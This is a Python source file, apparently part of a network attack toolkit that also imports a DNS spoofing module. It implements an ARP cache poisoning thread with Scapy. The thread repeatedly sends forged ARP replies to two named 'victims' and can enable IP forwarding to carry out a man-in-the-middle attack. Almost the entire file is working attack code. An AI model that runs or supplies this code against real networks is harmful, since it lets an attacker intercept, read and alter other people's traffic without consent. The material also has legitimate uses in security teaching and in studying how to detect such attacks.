from scapy.all import *
from scapy.layers import *
from scapy.layers.inet import IP
from dns_spoofing import *
import threading
import time
import socket
import nmap
import os
import sys

from getmac import get_mac_address
#from dns_spoofing import settings
from utils.interface import InterfaceConfig
# from utils.configuration import interface_config


class ARPSpoof(threading.Thread):

    def __init__(
        self,
        interface_config: InterfaceConfig,
        victim1_ip,
        victim2_ip,
        mitm: bool = False,
        restore: bool = True,
        duckforce: bool = True,
    ):
        super().__init__()
        
        self.interface_config = interface_config
        self.victim1_ip = victim1_ip
        self.victim2_ip = victim2_ip
        self.mitm = mitm
        self.restore = restore
        self.duckforce = duckforce
        
        self._stop_event = threading.Event()
        
        # self.query_user()
        
    # overrides of Thread
    # DO NOT TOUCH
    def run(self):
        self.start_attack()
        
    def join(self, timeout=None):
        self._stop_event.set()
        super().join(timeout)
        

    def start_attack(self):
        if self.victim1_ip == '0.0.0.0':
            print("\n \nSet your Victim's IP Address")
            self.victim1_ip = input()

        VICTIM1_MAC = getmacbyip(self.victim1_ip)
        VICTIM2_MAC = getmacbyip(self.victim2_ip)

        if self.mitm:
            print("\n Enabling IP Forwarding (MitM attack)...")
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        else:
            # Disable ip forward
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("closed")

        ATTACKER_MAC = self.interface_config.MAC_ADDR
        #print(ATTACKER_MAC)
        tic = -1
        
        while not self._stop_event.is_set():
            
            # implemented non blocking timer
            toc = time.perf_counter()
            if (tic != -1) and (toc - tic < 15):
                continue
                
            tic = time.perf_counter()
                
                
            #Poisoning the Victim
            arp = Ether() / ARP()
            arp[Ether].src = ATTACKER_MAC
            arp[ARP].hwsrc = ATTACKER_MAC
            arp[ARP].psrc = self.victim2_ip
            arp[ARP].hwdst = VICTIM1_MAC
            arp[ARP].pdst = self.victim1_ip

            sendp(arp, iface=self.interface_config.INTERFACE_NAME)

            #Poison the Server
            arp = Ether() / ARP()
            arp[Ether].src = ATTACKER_MAC
            arp[ARP].hwsrc = ATTACKER_MAC
            arp[ARP].psrc = self.victim1_ip
            arp[ARP].hwdst = VICTIM2_MAC
            arp[ARP].pdst = self.victim2_ip

            sendp(arp, iface=self.interface_config.INTERFACE_NAME)

            print("(Re-)poisoned the ARP of the following IPs: " +
                  self.victim1_ip + " and " + self.victim2_ip)
            
            if self.duckforce == False:
                break
            
        return

    def restore_arp(self):
        ATTACKER_MAC = self.interface_config.MAC_ADDR
        VICTIM1_MAC = getmacbyip(self.victim1_ip)
        VICTIM2_MAC = getmacbyip(self.victim2_ip)
        print(VICTIM1_MAC)
        print(VICTIM2_MAC)
        #print(ATTACKER_MAC)
        # Restore the ARP cache of the Victim
        arp = Ether() / ARP()
        arp[Ether].src = ATTACKER_MAC
        arp[Ether].dst = VICTIM2_MAC
        arp[ARP].hwsrc = VICTIM1_MAC
        arp[ARP].psrc = self.victim1_ip
        arp[ARP].hwdst = VICTIM2_MAC
        arp[ARP].pdst = self.victim2_ip
        sendp(arp, iface=self.interface_config.INTERFACE_NAME)


        # Restore the ARP cache of the Server
        arp = Ether() / ARP()
        arp[Ether].src = ATTACKER_MAC
        arp[Ether].dst = VICTIM1_MAC
        arp[ARP].hwsrc = VICTIM2_MAC
        arp[ARP].psrc = self.victim2_ip
        arp[ARP].hwdst = VICTIM1_MAC
        arp[ARP].pdst = self.victim1_ip
        sendp(arp, iface=self.interface_config.INTERFACE_NAME)

            

if __name__ == "__main__":
    try:
        print("running..")
    except KeyboardInterrupt:
        print('Exiting program arpapr...')
        #restore_arp(self)
